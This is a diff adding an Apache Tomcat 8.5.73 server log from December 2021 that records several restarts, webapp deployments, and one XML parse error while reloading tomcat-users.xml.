@@ -1,0 +1,611 @@
+08-Dec-2021 06:57:07.701 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
+08-Dec-2021 06:57:07.704 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
+08-Dec-2021 06:57:07.704 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
+08-Dec-2021 06:57:07.704 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+08-Dec-2021 06:57:07.704 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.11.0-1020-aws
+08-Dec-2021 06:57:07.705 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+08-Dec-2021 06:57:07.705 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-8-openjdk-amd64/jre
+08-Dec-2021 06:57:07.705 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_292-8u292-b10-0ubuntu1~20.04-b10
+08-Dec-2021 06:57:07.705 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Private Build
+08-Dec-2021 06:57:07.706 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /opt/tomcat/apache-tomcat-8.5.73
+08-Dec-2021 06:57:07.706 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /opt/tomcat/apache-tomcat-8.5.73
+08-Dec-2021 06:57:07.707 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/opt/tomcat/apache-tomcat-8.5.73/conf/logging.properties
+08-Dec-2021 06:57:07.712 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+08-Dec-2021 06:57:07.712 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+08-Dec-2021 06:57:07.713 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+08-Dec-2021 06:57:07.713 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+08-Dec-2021 06:57:07.714 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
+08-Dec-2021 06:57:07.714 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/opt/tomcat/apache-tomcat-8.5.73
+08-Dec-2021 06:57:07.716 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/opt/tomcat/apache-tomcat-8.5.73
+08-Dec-2021 06:57:07.717 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/opt/tomcat/apache-tomcat-8.5.73/temp
+08-Dec-2021 06:57:07.717 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib]
+08-Dec-2021 06:57:07.928 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8081"]
+08-Dec-2021 06:57:07.963 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
+08-Dec-2021 06:57:07.997 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 1505 ms
+08-Dec-2021 06:57:08.067 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+08-Dec-2021 06:57:08.067 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
+08-Dec-2021 06:57:08.108 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager]
+08-Dec-2021 06:57:08.640 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager] has finished in [527] ms
+08-Dec-2021 06:57:08.640 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs]
+08-Dec-2021 06:57:08.683 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs] has finished in [43] ms
+08-Dec-2021 06:57:08.684 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples]
+08-Dec-2021 06:57:09.172 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples] has finished in [488] ms
+08-Dec-2021 06:57:09.173 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager]
+08-Dec-2021 06:57:09.216 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager] has finished in [43] ms
+08-Dec-2021 06:57:09.216 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT]
+08-Dec-2021 06:57:09.269 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT] has finished in [53] ms
+08-Dec-2021 06:57:09.273 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8081"]
+08-Dec-2021 06:57:09.296 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 1299 ms
+08-Dec-2021 07:40:09.592 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.users.MemoryUserDatabase.backgroundProcess Reloading memory user database [UserDatabase] from updated source [file:/opt/tomcat/apache-tomcat-8.5.73/conf/tomcat-users.xml]
+08-Dec-2021 07:49:09.640 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.users.MemoryUserDatabase.backgroundProcess Reloading memory user database [UserDatabase] from updated source [file:/opt/tomcat/apache-tomcat-8.5.73/conf/tomcat-users.xml]
+08-Dec-2021 07:49:09.651 SEVERE [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.tomcat.util.digester.Digester.fatalError Parse Fatal Error at line 56 column 3: The element type "role" must be terminated by the matching end-tag "</role>".
+	org.xml.sax.SAXParseException; lineNumber: 56; columnNumber: 3; The element type "role" must be terminated by the matching end-tag "</role>".
+		at com.sun.org.apache.xerces.internal.util.ErrorHandlerWrapper.createSAXParseException(ErrorHandlerWrapper.java:203)
+		at com.sun.org.apache.xerces.internal.util.ErrorHandlerWrapper.fatalError(ErrorHandlerWrapper.java:177)
+		at com.sun.org.apache.xerces.internal.impl.XMLErrorReporter.reportError(XMLErrorReporter.java:400)
+		at com.sun.org.apache.xerces.internal.impl.XMLErrorReporter.reportError(XMLErrorReporter.java:327)
+		at com.sun.org.apache.xerces.internal.impl.XMLScanner.reportFatalError(XMLScanner.java:1473)
+		at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanEndElement(XMLDocumentFragmentScannerImpl.java:1749)
+		at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:2967)
+		at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:602)
+		at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:505)
+		at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:842)
+		at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:771)
+		at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:141)
+		at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1213)
+		at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:643)
+		at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1513)
+		at org.apache.catalina.users.MemoryUserDatabase.open(MemoryUserDatabase.java:453)
+		at org.apache.catalina.users.MemoryUserDatabase.backgroundProcess(MemoryUserDatabase.java:689)
+		at org.apache.catalina.realm.UserDatabaseRealm.backgroundProcess(UserDatabaseRealm.java:138)
+		at org.apache.catalina.realm.CombinedRealm.backgroundProcess(CombinedRealm.java:308)
+		at org.apache.catalina.core.ContainerBase.backgroundProcess(ContainerBase.java:1156)
+		at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1396)
+		at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(ContainerBase.java:1368)
+		at java.lang.Thread.run(Thread.java:748)
+08-Dec-2021 07:49:09.653 SEVERE [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.users.MemoryUserDatabase.backgroundProcess Error reloading memory user database [UserDatabase] from updated source [file:/opt/tomcat/apache-tomcat-8.5.73/conf/tomcat-users.xml]
+	org.xml.sax.SAXParseException; lineNumber: 56; columnNumber: 3; The element type "role" must be terminated by the matching end-tag "</role>".
+		at com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser.parse(AbstractSAXParser.java:1239)
+		at com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser.parse(SAXParserImpl.java:643)
+		at org.apache.tomcat.util.digester.Digester.parse(Digester.java:1513)
+		at org.apache.catalina.users.MemoryUserDatabase.open(MemoryUserDatabase.java:453)
+		at org.apache.catalina.users.MemoryUserDatabase.backgroundProcess(MemoryUserDatabase.java:689)
+		at org.apache.catalina.realm.UserDatabaseRealm.backgroundProcess(UserDatabaseRealm.java:138)
+		at org.apache.catalina.realm.CombinedRealm.backgroundProcess(CombinedRealm.java:308)
+		at org.apache.catalina.core.ContainerBase.backgroundProcess(ContainerBase.java:1156)
+		at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1396)
+		at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(ContainerBase.java:1368)
+		at java.lang.Thread.run(Thread.java:748)
+08-Dec-2021 08:01:29.715 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.users.MemoryUserDatabase.backgroundProcess Reloading memory user database [UserDatabase] from updated source [file:/opt/tomcat/apache-tomcat-8.5.73/conf/tomcat-users.xml]
+08-Dec-2021 08:02:51.147 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
+08-Dec-2021 08:02:51.147 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8081"]
+08-Dec-2021 08:02:51.151 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
+08-Dec-2021 08:02:51.214 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8081"]
+08-Dec-2021 08:02:51.217 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8081"]
+08-Dec-2021 08:03:39.962 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
+08-Dec-2021 08:03:39.967 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
+08-Dec-2021 08:03:39.972 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
+08-Dec-2021 08:03:39.972 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+08-Dec-2021 08:03:39.972 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.11.0-1020-aws
+08-Dec-2021 08:03:39.972 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+08-Dec-2021 08:03:39.973 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-8-openjdk-amd64/jre
+08-Dec-2021 08:03:39.973 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_292-8u292-b10-0ubuntu1~20.04-b10
+08-Dec-2021 08:03:39.973 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Private Build
+08-Dec-2021 08:03:39.974 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /opt/tomcat/apache-tomcat-8.5.73
+08-Dec-2021 08:03:39.974 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /opt/tomcat/apache-tomcat-8.5.73
+08-Dec-2021 08:03:39.974 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/opt/tomcat/apache-tomcat-8.5.73/conf/logging.properties
+08-Dec-2021 08:03:39.974 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+08-Dec-2021 08:03:39.975 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+08-Dec-2021 08:03:39.975 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+08-Dec-2021 08:03:39.975 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+08-Dec-2021 08:03:39.976 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
+08-Dec-2021 08:03:39.976 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/opt/tomcat/apache-tomcat-8.5.73
+08-Dec-2021 08:03:39.978 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/opt/tomcat/apache-tomcat-8.5.73
+08-Dec-2021 08:03:39.978 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/opt/tomcat/apache-tomcat-8.5.73/temp
+08-Dec-2021 08:03:39.978 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib]
+08-Dec-2021 08:03:40.152 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8081"]
+08-Dec-2021 08:03:40.181 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
+08-Dec-2021 08:03:40.208 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 1244 ms
+08-Dec-2021 08:03:40.281 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+08-Dec-2021 08:03:40.281 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
+08-Dec-2021 08:03:40.308 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager]
+08-Dec-2021 08:03:40.813 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager] has finished in [499] ms
+08-Dec-2021 08:03:40.813 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs]
+08-Dec-2021 08:03:40.847 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs] has finished in [34] ms
+08-Dec-2021 08:03:40.852 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples]
+08-Dec-2021 08:03:41.297 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples] has finished in [445] ms
+08-Dec-2021 08:03:41.301 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager]
+08-Dec-2021 08:03:41.337 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager] has finished in [36] ms
+08-Dec-2021 08:03:41.340 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT]
+08-Dec-2021 08:03:41.398 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT] has finished in [58] ms
+08-Dec-2021 08:03:41.401 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8081"]
+08-Dec-2021 08:03:41.424 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 1215 ms
+09-Dec-2021 02:05:28.368 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
+09-Dec-2021 02:05:28.370 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:05:28.378 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
+09-Dec-2021 02:05:28.444 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:05:28.448 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:10:29.994 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
+09-Dec-2021 02:10:30.002 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
+09-Dec-2021 02:10:30.002 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
+09-Dec-2021 02:10:30.002 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+09-Dec-2021 02:10:30.002 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.11.0-1020-aws
+09-Dec-2021 02:10:30.003 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+09-Dec-2021 02:10:30.003 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-8-openjdk-amd64/jre
+09-Dec-2021 02:10:30.003 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_292-8u292-b10-0ubuntu1~20.04-b10
+09-Dec-2021 02:10:30.003 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Private Build
+09-Dec-2021 02:10:30.003 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:10:30.003 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:10:30.003 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/opt/tomcat/apache-tomcat-8.5.73/conf/logging.properties
+09-Dec-2021 02:10:30.003 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+09-Dec-2021 02:10:30.003 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+09-Dec-2021 02:10:30.003 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+09-Dec-2021 02:10:30.004 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+09-Dec-2021 02:10:30.004 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
+09-Dec-2021 02:10:30.004 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:10:30.004 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:10:30.007 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/opt/tomcat/apache-tomcat-8.5.73/temp
+09-Dec-2021 02:10:30.007 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The Apache Tomcat Native library which allows using OpenSSL was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib]
+09-Dec-2021 02:10:30.241 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:10:30.275 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
+09-Dec-2021 02:10:30.310 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 1433 ms
+09-Dec-2021 02:10:30.394 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+09-Dec-2021 02:10:30.394 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet engine: [Apache Tomcat/8.5.73]
+09-Dec-2021 02:10:30.428 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager]
+09-Dec-2021 02:10:30.984 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager] has finished in [551] ms
+09-Dec-2021 02:10:30.984 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs]
+09-Dec-2021 02:10:31.025 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/docs] has finished in [41] ms
+09-Dec-2021 02:10:31.028 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples]
+09-Dec-2021 02:10:31.521 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/examples] has finished in [493] ms
+09-Dec-2021 02:10:31.522 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager]
+09-Dec-2021 02:10:31.565 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/host-manager] has finished in [42] ms
+09-Dec-2021 02:10:31.565 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT]
+09-Dec-2021 02:10:31.623 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/ROOT] has finished in [58] ms
+09-Dec-2021 02:10:31.629 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:10:31.645 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 1334 ms
+09-Dec-2021 02:28:51.773 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] org.apache.catalina.startup.HostConfig.undeploy Undeploying context [/manager]
+09-Dec-2021 02:28:51.796 INFO [localhost-startStop-2] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager]
+09-Dec-2021 02:28:51.834 INFO [localhost-startStop-2] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/opt/tomcat/apache-tomcat-8.5.73/webapps/manager] has finished in [38] ms
+09-Dec-2021 02:32:09.558 INFO [main] org.apache.catalina.core.StandardServer.await A valid shutdown command was received via the shutdown port. Stopping the Server instance.
+09-Dec-2021 02:32:09.559 INFO [main] org.apache.coyote.AbstractProtocol.pause Pausing ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:32:09.563 INFO [main] org.apache.catalina.core.StandardService.stopInternal Stopping service [Catalina]
+09-Dec-2021 02:32:09.609 INFO [main] org.apache.coyote.AbstractProtocol.stop Stopping ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:32:09.611 INFO [main] org.apache.coyote.AbstractProtocol.destroy Destroying ProtocolHandler ["http-nio-8081"]
+09-Dec-2021 02:33:07.394 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.73
+09-Dec-2021 02:33:07.398 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Nov 11 2021 13:14:36 UTC
+09-Dec-2021 02:33:07.399 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version number: 8.5.73.0
+09-Dec-2021 02:33:07.400 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+09-Dec-2021 02:33:07.401 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.11.0-1020-aws
+09-Dec-2021 02:33:07.401 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+09-Dec-2021 02:33:07.401 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-8-openjdk-amd64/jre
+09-Dec-2021 02:33:07.401 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_292-8u292-b10-0ubuntu1~20.04-b10
+09-Dec-2021 02:33:07.401 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Private Build
+09-Dec-2021 02:33:07.402 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:33:07.402 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:33:07.404 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/opt/tomcat/apache-tomcat-8.5.73/conf/logging.properties
+09-Dec-2021 02:33:07.405 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+09-Dec-2021 02:33:07.405 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+09-Dec-2021 02:33:07.405 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+09-Dec-2021 02:33:07.405 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dorg.apache.catalina.security.SecurityListener.UMASK=0027
+09-Dec-2021 02:33:07.406 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dignore.endorsed.dirs=
+09-Dec-2021 02:33:07.406 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:33:07.408 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/opt/tomcat/apache-tomcat-8.5.73
+09-Dec-2021 02:33:07.409 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/opt/tomcat/apache-tomcat-8.5.73/temp
